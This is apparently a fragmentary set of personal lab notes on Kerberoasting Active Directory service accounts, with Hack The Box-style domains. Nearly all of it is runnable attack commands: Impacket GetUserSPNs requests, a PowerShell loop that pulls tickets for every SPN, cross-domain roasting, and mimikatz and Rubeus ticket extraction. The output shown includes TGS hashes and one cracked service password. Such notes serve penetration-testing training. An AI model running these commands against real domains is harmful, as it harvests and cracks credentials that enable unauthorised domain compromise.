...
```
$ GetUserSPNs.py -dc-ip 172.16.5.5 ad.someorg.local/forend 
```

`kerberoast all accounts`
```
$ GetUserSPNs.py -dc-ip 10.10.11.72 tombwatcher.htb/sam -request -outputfile SAPSERVICE_TGS
```

`### Requesting single TGS`
```
GetUserSPNs.py -dc-ip 172.16.5.5 ad.someorg.local/forend -request-user  SAPService -outputfile SAPSERVICE_TGS
```
...
```
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL  ad.someorg.local/forend -request-user  sapsso -request  -outputfile sspoTGS
...
<SNIP>
$krb5tgs$23$*SAPService$ad.someorg.local$ad.someorg.local/SAPService*$607cd881e31ff8651ff745f972c7af9c$70912a62c75e456e5065e72c9b5029442078aa1cc:!SapperFi2
```
### Blind Kerberoasting: 
**requesting TGS tickets for guessed SPNs _without_ first enumerating SPNs via LDAP. It **requires a valid TGT** to make TGS-REQs.
...
```
PS C:\Tools> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "vmware/ad.someorg.local"

```

`Kerberoasting (Retrieving All TGs with setspn.exe`
```powershell-session
PS C:\htb> setspn.exe -T ad.someorg.local -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```
...
[*] Hash                   : $krb5tgs$23$*backupagent$ad.someorg.local$backupjob/veam001.ad.someorg.local@IN
```
...
--------------------                   ----------------------------- --------------
testspn/kerberoast.ad.someorg.local                            0 testspn
```
...
[*] Hash                   : $krb5tgs$18$testspn$ad.someorg.local$*
```
...
-------------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  --------------------------  ----------
MSSQLSvc/ACADEMY-EA-DB01.ad.someorg.local:1433  damundsen          CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                         2022-03-24 12:20:34.127432  2022-04-10 18:50:58.924378             
...
backupjob/veam001.ad.someorg.local              backupagent        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  2022-04-18 21:20:32.090310                                                  
```
...
```shell-session
$ GetUserSPNs.py -dc-ip 172.16.5.5 ad.someorg.local/forend -request 
...
MSSQL/ACADEMY-EA-FILE                              damundsen          CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                         2022-03-24 12:20:34.127432  2022-04-10 18:50:58.924378             
backupjob/veam001.ad.someorg.local              backupagent        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  2022-04-18 21:20:32.090310             
sts/ad.someorg.local                            solarwindsmonitor  CN=Domain 
```
 KERBEROAST DIFFERENT DOMAIN
```
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL  ad.someorg.local/forend -request-user  sapsso -request  -outputfile sspoTGS
...
ServicePrincipalName : vmware/ad.someorg.local
...
mimikatz # kerberos::list /export  <------ INPUT THIS [+]
   ...
   * Saved to file     : 0-40e10000-htb-student@krbtgt~ad.someorg.local-ad.someorg.local.kirbi
```
...
serviceprincipalname                   msds-supportedencryptiontypes samaccountname
--------------------                   ----------------------------- --------------
testspn/kerberoast.ad.someorg.local                            24 testspn
```
Requesting a new ticket with Rubeus will show us that the account name is using AES-256 (type 18) encryption.
```powershell-session
 .\Rubeus.exe kerberoast /user:testspn /nowrap
...
Hash.Target......: $krb5tgs$18$testspn$ad.someorg.local$8939f8c5b97...413d53
